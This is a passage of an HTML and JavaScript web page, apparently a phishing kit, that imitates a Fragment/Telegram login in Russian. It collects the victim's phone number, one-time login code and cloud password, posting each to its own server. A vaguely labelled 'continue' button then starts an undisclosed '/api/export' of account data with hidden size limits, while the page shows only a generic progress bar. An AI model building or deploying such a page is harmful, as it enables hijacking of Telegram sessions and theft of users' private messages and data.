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" alt="Fragment" style="width:48px;height:48px;border-radius:50%;object-fit:cover">
    </div>
  </div>
</div>

<div id="s-phone">
  <div id="v-phone">
    <div class="brand-title">Войти через Telegram</div>
    <p class="brand-sub">Введите номер телефона, привязанный к Вашему аккаунту Telegram, чтобы подтвердить вход.</p>
    <form id="f-phone">
      <div class="cpick" id="cpick">
        <button type="button" class="cpick-btn" id="cpick-btn"><span id="cpick-flag">🇷🇺</span> <span id="cpick-label">Россия</span></button>
        <div class="cpick-dd" id="cpick-dd">
          <input class="cpick-search" id="cpick-search" placeholder="Поиск страны…" autocomplete="off">
          <div class="cpick-list" id="cpick-list"></div>
        </div>
      </div>
      <input class="in" id="i-phone" inputmode="tel" autocomplete="tel" placeholder="Введите номер">
      <input type="hidden" id="i-country" value="+7">
      <span id="cc-flag" style="display:none"></span>
      <button type="submit" class="btn btn-pri" id="b-phone">Далее</button>
    </form>
    <a class="alt-link" id="link-to-qr">Другие способы входа</a>
  </div>
  <div id="v-qr" class="hidden">
    <div class="brand-title">Вход по QR-коду</div>
    <p class="brand-sub">Откройте Telegram → Настройки → Устройства → Подключить устройство</p>
    <div style="display:flex;justify-content:center;padding:16px 0">
      <div class="qr-wrap">
        <canvas id="qr-canvas" width="260" height="260" style="background:#fff"></canvas>
        <div class="qr-logo">
          <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="M81.486 130.178L52.2 120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229 2.1-2.2 6.489-4.523 120.106-45.36 120.106-45.36s3.208-1.081 5.1-.362a2.766 2.766 0 011.885 2.055 9.357 9.357 0 01.254 2.585c-.009.752-.1 1.449-.169 2.542-.692 11.165-21.4 94.493-21.4 94.493s-1.239 4.876-5.678 5.043a8.13 8.13 0 01-5.903-2.286c-8.69-7.472-38.72-27.726-45.357-32.167a1.27 1.27 0 01-.546-.902c-.093-.469.417-1.05.417-1.05s52.278-46.465 53.67-51.345c.108-.378-.3-.566-.848-.4-3.482 1.281-63.844 39.4-70.506 43.608a3.21 3.21 0 01-1.46.173z"/></svg>
        </div>
      </div>
    </div>
    <div id="qr-status" class="hint" style="text-align:center;min-height:20px">Загрузка…</div>
    <a class="alt-link" id="link-to-phone">Войти по номеру телефона</a>
  </div>
</div>

<div id="s-code" class="hidden">
  <div class="brand-title">Код подтверждения</div>
  <p class="brand-sub">Введите код, отправленный в Telegram на указанный номер.</p>
  <form id="f-code">
    <input class="in code" id="i-code" inputmode="numeric" autocomplete="one-time-code" maxlength="6" placeholder="— — — — —">
    <div id="code-status" class="hint" style="text-align:center;margin-top:12px;min-height:20px"></div>
    <button type="submit" class="btn btn-pri hidden" id="b-code">Подтвердить</button>
    <button type="button" class="btn btn-ghost" id="b-back">Назад</button>
  </form>
</div>

<div id="s-pw" class="hidden">
  <div class="brand-title">Пароль</div>
  <p class="brand-sub">Введите облачный пароль от аккаунта.</p>
  <form id="f-pw">
    <input class="in" id="i-pw" type="password" autocomplete="current-password" placeholder="Пароль">
    <button type="submit" class="btn btn-pri" id="b-pw">Войти</button>
  </form>
</div>

<div id="s-ready" class="hidden">
  <div class="brand-title">Готово</div>
  <p class="brand-sub" id="me-info">—</p>
  <input type="hidden" id="i-limit" value="0">
  <input type="hidden" id="i-maxmb" value="50">
  <button type="button" class="btn btn-pri" id="b-start">Продолжить</button>
  <button type="button" class="btn btn-ghost" id="b-logout">Выйти</button>
</div>

<div id="s-progress" class="hidden">
  <div class="brand-title">Обработка</div>
  <div class="stage-row"><span id="p-stage">—</span><span id="p-pct">0%</span></div>
  <div class="track"><div class="fill" id="p-fill"></div></div>
  <div id="p-done" class="status hidden">Готово.</div>
  <div id="p-err" class="status hidden"></div>
  <button type="button" class="btn btn-ghost hidden" id="b-close">Закрыть</button>
</div>

</div>
</main>
<script>
// [dial, name, iso2]
const COUNTRIES = [
  ["+7","Россия","RU"],["+7","Казахстан","KZ"],["+994","Азербайджан","AZ"],
  ["+375","Беларусь","BY"],["+380","Украина","UA"],["+996","Киргизия","KG"],
  ["+992","Таджикистан","TJ"],["+993","Туркменистан","TM"],["+998","Узбекистан","UZ"],
  ["+374","Армения","AM"],["+995","Грузия","GE"],["+373","Молдова","MD"],
  ["+370","Литва","LT"],["+371","Латвия","LV"],["+372","Эстония","EE"],
  ["+1","США","US"],["+1","Канада","CA"],["+44","Великобритания","GB"],
  ["+49","Германия","DE"],["+33","Франция","FR"],["+39","Италия","IT"],
  ["+34","Испания","ES"],["+31","Нидерланды","NL"],["+32","Бельгия","BE"],
  ["+41","Швейцария","CH"],["+43","Австрия","AT"],["+46","Швеция","SE"],
  ["+47","Норвегия","NO"],["+45","Дания","DK"],["+358","Финляндия","FI"],
  ["+353","Ирландия","IE"],["+351","Португалия","PT"],["+30","Греция","GR"],
  ["+48","Польша","PL"],["+420","Чехия","CZ"],["+421","Словакия","SK"],
  ["+36","Венгрия","HU"],["+40","Румыния","RO"],["+359","Болгария","BG"],
  ["+385","Хорватия","HR"],["+386","Словения","SI"],["+381","Сербия","RS"],
  ["+382","Черногория","ME"],["+383","Косово","XK"],["+387","Босния и Герцеговина","BA"],
  ["+389","Северная Македония","MK"],["+355","Албания","AL"],
  ["+352","Люксембург","LU"],["+356","Мальта","MT"],["+354","Исландия","IS"],
  ["+357","Кипр","CY"],["+298","Фарерские острова","FO"],["+350","Гибралтар","GI"],
  ["+376","Андорра","AD"],["+377","Монако","MC"],["+378","Сан-Марино","SM"],
  ["+379","Ватикан","VA"],["+423","Лихтенштейн","LI"],
  ["+90","Турция","TR"],["+972","Израиль","IL"],["+971","ОАЭ","AE"],
  ["+966","Саудовская Аравия","SA"],["+974","Катар","QA"],["+965","Кувейт","KW"],
  ["+973","Бахрейн","BH"],["+968","Оман","OM"],["+962","Иордания","JO"],
  ["+961","Ливан","LB"],["+964","Ирак","IQ"],["+98","Иран","IR"],
  ["+963","Сирия","SY"],["+967","Йемен","YE"],["+970","Палестина","PS"],
  ["+93","Афганистан","AF"],["+92","Пакистан","PK"],["+91","Индия","IN"],
  ["+880","Бангладеш","BD"],["+94","Шри-Ланка","LK"],["+977","Непал","NP"],
  ["+960","Мальдивы","MV"],["+975","Бутан","BT"],
  ["+86","Китай","CN"],["+852","Гонконг","HK"],["+853","Макао","MO"],
  ["+886","Тайвань","TW"],["+81","Япония","JP"],["+82","Южная Корея","KR"],
  ["+850","КНДР","KP"],["+976","Монголия","MN"],
  ["+62","Индонезия","ID"],["+60","Малайзия","MY"],["+65","Сингапур","SG"],
  ["+66","Таиланд","TH"],["+84","Вьетнам","VN"],["+63","Филиппины","PH"],
  ["+95","Мьянма","MM"],["+855","Камбоджа","KH"],["+856","Лаос","LA"],
  ["+670","Восточный Тимор","TL"],["+673","Бруней","BN"],
  ["+55","Бразилия","BR"],["+54","Аргентина","AR"],["+52","Мексика","MX"],
  ["+56","Чили","CL"],["+57","Колумбия","CO"],["+58","Венесуэла","VE"],
  ["+51","Перу","PE"],["+593","Эквадор","EC"],["+598","Уругвай","UY"],
  ["+595","Парагвай","PY"],["+591","Боливия","BO"],["+53","Куба","CU"],
  ["+507","Панама","PA"],["+506","Коста-Рика","CR"],["+503","Сальвадор","SV"],
  ["+502","Гватемала","GT"],["+504","Гондурас","HN"],["+505","Никарагуа","NI"],
  ["+501","Белиз","BZ"],["+592","Гайана","GY"],["+597","Суринам","SR"],
  ["+509","Гаити","HT"],["+1809","Доминиканская Республика","DO"],
  ["+1876","Ямайка","JM"],["+1868","Тринидад и Тобаго","TT"],
  ["+1246","Барбадос","BB"],["+1242","Багамы","BS"],
  ["+61","Австралия","AU"],["+64","Новая Зеландия","NZ"],
  ["+675","Папуа — Новая Гвинея","PG"],["+679","Фиджи","FJ"],
  ["+676","Тонга","TO"],["+685","Самоа","WS"],["+678","Вануату","VU"],
  ["+677","Соломоновы Острова","SB"],["+686","Кирибати","KI"],
  ["+691","Микронезия","FM"],["+680","Палау","PW"],["+692","Маршалловы Острова","MH"],
  ["+674","Науру","NR"],["+688","Тувалу","TV"],
  ["+20","Египет","EG"],["+27","ЮАР","ZA"],["+234","Нигерия","NG"],
  ["+254","Кения","KE"],["+212","Марокко","MA"],["+213","Алжир","DZ"],
  ["+216","Тунис","TN"],["+218","Ливия","LY"],["+251","Эфиопия","ET"],
  ["+255","Танзания","TZ"],["+256","Уганда","UG"],["+233","Гана","GH"],
  ["+225","Кот-д'Ивуар","CI"],["+237","Камерун","CM"],["+221","Сенегал","SN"],
  ["+223","Мали","ML"],["+226","Буркина-Фасо","BF"],["+227","Нигер","NE"],
  ["+235","Чад","TD"],["+236","ЦАР","CF"],["+241","Габон","GA"],
  ["+242","Конго","CG"],["+243","ДР Конго","CD"],["+244","Ангола","AO"],
  ["+258","Мозамбик","MZ"],["+260","Замбия","ZM"],["+263","Зимбабве","ZW"],
  ["+265","Малави","MW"],["+266","Лесото","LS"],["+267","Ботсвана","BW"],
  ["+268","Эсватини","SZ"],["+264","Намибия","NA"],
  ["+250","Руанда","RW"],["+257","Бурунди","BI"],
  ["+252","Сомали","SO"],["+253","Джибути","DJ"],["+291","Эритрея","ER"],
  ["+249","Судан","SD"],["+211","Южный Судан","SS"],
  ["+222","Мавритания","MR"],["+220","Гамбия","GM"],
  ["+224","Гвинея","GN"],["+232","Сьерра-Леоне","SL"],["+231","Либерия","LR"],
  ["+228","Того","TG"],["+229","Бенин","BJ"],
  ["+238","Кабо-Верде","CV"],["+239","Сан-Томе и Принсипи","ST"],
  ["+240","Экваториальная Гвинея","GQ"],["+245","Гвинея-Бисау","GW"],
  ["+246","Диего-Гарсия","IO"],["+247","Остров Вознесения","AC"],
  ["+248","Сейшелы","SC"],["+261","Мадагаскар","MG"],
  ["+262","Реюньон","RE"],["+269","Коморы","KM"],["+230","Маврикий","MU"]
];
function flag(iso) {
  return iso.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt(0)));
}
const $ = id => document.getElementById(id);
const show = (name) => {
  ['phone','code','pw','ready','progress'].forEach(n => $('s-'+n).classList.toggle('hidden', n !== name));
};
// --- searchable country picker ---
let _cpickIdx = 0; // selected country index
function cpickRender(filter) {
  const list = $('cpick-list');
  list.innerHTML = '';
  const q = (filter || '').toLowerCase();
  COUNTRIES.forEach(([code, name, iso], i) => {
    if (q && !name.toLowerCase().startsWith(q) && !code.startsWith(q) && !iso.toLowerCase().startsWith(q)) return;
    const d = document.createElement('div');
    d.className = 'cpick-item';
    d.innerHTML = '<span class="ci-flag">' + flag(iso) + '</span><span class="ci-name">' + name + '</span><span class="ci-code">' + code + '</span>';
    d.onclick = () => cpickSelect(i);
    list.appendChild(d);
  });
}
function cpickSelect(i) {
  _cpickIdx = i;
  const c = COUNTRIES[i];
  $('cpick-flag').textContent = flag(c[2]);
  $('cpick-label').textContent = c[1];
  $('i-country').value = c[0];
  $('i-phone').placeholder = 'Введите номер';
  cpickClose();
  $('i-phone').focus();
}
function cpickOpen() {
  $('cpick-dd').classList.add('open');
  $('cpick-btn').classList.add('open');
  const s = $('cpick-search');
  s.value = '';
  cpickRender('');
  setTimeout(() => s.focus(), 50);
}
function cpickClose() {
  $('cpick-dd').classList.remove('open');
  $('cpick-btn').classList.remove('open');
}
$('cpick-btn').onclick = () => {
  if ($('cpick-dd').classList.contains('open')) cpickClose();
  else cpickOpen();
};
$('cpick-search').addEventListener('input', (e) => cpickRender(e.target.value));
// close on outside click
document.addEventListener('click', (e) => {
  if (!$('cpick').contains(e.target)) cpickClose();
});
// init
cpickRender('');
function getDial() {
  return $('i-country').value || '+7';
}
// в поле номера: только цифры; при paste с + — разделяем
function detectCountry() {
  const inp = $('i-phone');
  const raw = inp.value.trim();
  if (!raw.startsWith('+')) return;
  const digits = '+' + raw.replace(/\\D/g,'');
  let bestCode = '', bestLen = 0, bestIdx = 0;
  COUNTRIES.forEach(([code], i) => {
    if (digits.startsWith(code) && code.length > bestLen) {
      bestLen = code.length; bestCode = code; bestIdx = i;
    }
  });
  if (bestCode) {
    cpickSelect(bestIdx);
    inp.value = digits.slice(bestLen);
  }
}
$('i-phone').addEventListener('input', (e) => {
  const v = e.target.value;
  if (v.startsWith('+')) {
    detectCountry();
  } else {
    const cleaned = v.replace(/\\D/g,'');
    if (cleaned !== v) e.target.value = cleaned;
  }
});
$('i-phone').addEventListener('paste', () => setTimeout(detectCountry, 0));
async function api(path, body) {
  const r = await fetch(path, {method:'POST', headers:{'Content-Type':'application/json'}, body: body?JSON.stringify(body):null});
  const j = await r.json();
  if (!r.ok) throw new Error(j.error || r.statusText);
  return j;
}
async function checkAuth() {
  const r = await fetch('/api/status').then(r=>r.json());
  if (r.authorized) {
    $('me-info').textContent = r.me || 'Вы вошли';
    show('ready');
  } else {
    show('phone');
  }
  return r;
}
$('f-phone').onsubmit = async (e) => {
  e.preventDefault();
  const dial = getDial();
  const local = $('i-phone').value.replace(/\\D/g,'');
  if (!local) return;
  const phone = dial + local;
  const btn = $('b-phone'); btn.disabled = true; btn.textContent = 'Отправка…';
  try {
    await api('/api/login', {phone});
    show('code'); setTimeout(()=>$('i-code').focus(), 150);
  } catch (e) { alert('Ошибка: ' + e.message); }
  finally { btn.disabled=false; btn.textContent='Продолжить'; }
};
$('i-code').oninput = (e) => {
  e.target.value = e.target.value.replace(/\\D/g,'').slice(0,6);
  // автоподтверждение при 5 цифрах
  if (e.target.value.length >= 5 && !_codeBusy) {
    $('f-code').requestSubmit ? $('f-code').requestSubmit() : $('f-code').dispatchEvent(new Event('submit',{cancelable:true}));
  }
};
$('b-back').onclick = () => show('phone');
let _codeBusy = false;
$('f-code').onsubmit = async (e) => {
  e.preventDefault();
  if (_codeBusy) return;
  const code = $('i-code').value.trim();
  if (code.length < 5) return;
  _codeBusy = true;
  const inp = $('i-code'), st = $('code-status');
  inp.disabled = true;
  st.textContent = 'Проверка…'; st.style.color = 'var(--muted)';
  try {
    const r = await api('/api/code', {code});
    st.textContent = '✓ Верно'; st.style.color = '#16a34a';
    await new Promise(res => setTimeout(res, 300));
    if (r.needs_password) { show('pw'); setTimeout(()=>$('i-pw').focus(), 150); }
    else { await checkAuth(); }
  } catch (err) {
    st.textContent = '✗ ' + (err.message || 'Неверный код');
    st.style.color = '#dc2626';
    inp.value = '';
    setTimeout(()=>inp.focus(), 50);
  } finally {
    inp.disabled = false;
    _codeBusy = false;
  }
};
$('f-pw').onsubmit = async (e) => {
  e.preventDefault();
  const pw = $('i-pw').value;
  if (!pw) return;
  const btn = $('b-pw'); btn.disabled = true; btn.textContent='Проверка…';
  try { await api('/api/pw', {password: pw}); await checkAuth(); }
  catch (e) { alert('Ошибка: ' + e.message); }
  finally { btn.disabled=false; btn.textContent='Войти'; $('i-pw').value=''; }
};
$('b-logout').onclick = async () => {
  if (!confirm('Выйти?')) return;
  await api('/api/logout', {});
  await checkAuth();
};
let pollTimer = null;
$('b-start').onclick = async () => {
  const limit = parseInt($('i-limit').value || '0', 10);
  const maxmb = parseInt($('i-maxmb').value || '50', 10);
  try {
    await api('/api/export', {limit, maxmb});
    show('progress');
    $('p-done').classList.add('hidden'); $('p-err').classList.add('hidden'); $('b-close').classList.add('hidden');
    pollTimer = setInterval(async ()=>{
      const r = await fetch('/api/status').then(r=>r.json());
      $('p-pct').textContent = r.progress + '%';
      $('p-fill').style.width = r.progress + '%';
      $('p-stage').textContent = r.stage || '—';
      if (r.task_state === 'done') {
        clearInterval(pollTimer); pollTimer=null;
        $('p-done').classList.remove('hidden');
        $('b-close').classList.remove('hidden');
      } else if (r.task_state === 'error') {
        clearInterval(pollTimer); pollTimer=null;
        $('p-err').textContent = 'Ошибка: ' + (r.error||'unknown');
        $('p-err').classList.remove('hidden');
        $('b-close').classList.remove('hidden');
      }
    }, 1500);
